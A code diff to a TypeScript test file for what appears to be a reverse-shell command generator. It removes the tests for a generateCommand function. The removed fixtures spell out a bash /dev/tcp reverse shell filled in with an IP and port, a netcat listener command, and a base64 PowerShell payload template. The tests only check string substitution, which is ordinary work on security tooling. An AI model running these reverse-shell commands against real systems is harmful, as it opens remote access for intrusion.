@@ -10,7 +10,6 @@ import {
   base64Encode,
   base64Decode,
   replacePlaceholders,
-  generateCommand,
   groupBySubcategory,
   getOSTagColor,
   getDeviconUrl,
@@ -306,69 +305,6 @@ describe("replacePlaceholders", () => {
     const command = "echo hello";
     const result = replacePlaceholders(command, "192.168.1.1", "4444");
     expect(result).toBe("echo hello");
-  });
-});
-
-// ============================================================================
-// generateCommand Tests
-// ============================================================================
-
-describe("generateCommand", () => {
-  const baseTemplate: ShellTemplate = {
-    type: "bash-tcp",
-    name: "Bash TCP",
-    icon: "🐚",
-    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
-    description: "Test template",
-    category: "reverse",
-    subcategory: "Shell Tools",
-    os: ["linux"],
-    listener: "nc -lvnp {PORT}",
-  };
-
-  it("replaces placeholders in command", () => {
-    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
-    expect(result.command).toBe("bash -i >& /dev/tcp/10.10.10.10/9001 0>&1");
-  });
-
-  it("replaces placeholders in listener", () => {
-    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
-    expect(result.listener).toBe("nc -lvnp 9001");
-  });
-
-  it("preserves other template properties", () => {
-    const result = generateCommand(baseTemplate, "10.10.10.10", "9001");
-    expect(result.type).toBe("bash-tcp");
-    expect(result.name).toBe("Bash TCP");
-    expect(result.icon).toBe("🐚");
-    expect(result.description).toBe("Test template");
-    expect(result.category).toBe("reverse");
-    expect(result.subcategory).toBe("Shell Tools");
-    expect(result.os).toEqual(["linux"]);
-  });
-
-  it("handles powershell-base64 specially", () => {
-    const originalCommand = "powershell -enc {IP}:{PORT}";
-    const encoded = base64Encode(originalCommand);
-
-    const b64Template: ShellTemplate = {
-      type: "powershell-base64",
-      name: "PowerShell Base64",
-      icon: "💻",
-      command: encoded,
-      description: "Base64 encoded PowerShell",
-      category: "reverse",
-      subcategory: "Windows",
-      os: ["windows"],
-    };
-
-    const result = generateCommand(b64Template, "192.168.1.1", "4444");
-
-    // The result should be re-encoded with replaced placeholders
-    // The result should be re-encoded with replaced placeholders
-    const decodedResult = base64Decode(result.command);
-    expect(decodedResult).toBe("powershell -enc 192.168.1.1:4444");
-    // Verified above
   });
 });
 
